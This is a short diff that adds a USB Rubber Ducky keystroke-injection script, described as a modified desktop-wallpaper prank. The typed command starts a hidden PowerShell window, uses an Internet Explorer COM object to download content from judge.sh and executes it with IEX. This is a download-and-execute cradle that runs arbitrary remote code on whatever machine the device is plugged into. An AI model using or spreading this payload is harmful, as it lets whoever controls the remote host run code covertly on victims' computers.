@@ -1,0 +1,7 @@
+REM This is a modified version of https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Change-desktop-background-(win10)
+REM The cradle has been updated to work around a TLS issue
+REM ONLY RUN THIS IF YOU TRUST judge.sh (cradle pulls more powershell from there)
+GUI r
+DELAY 250
+STRING powershell -windowstyle hidden $ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://judge.sh/wallpaper.php');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
+ENTER
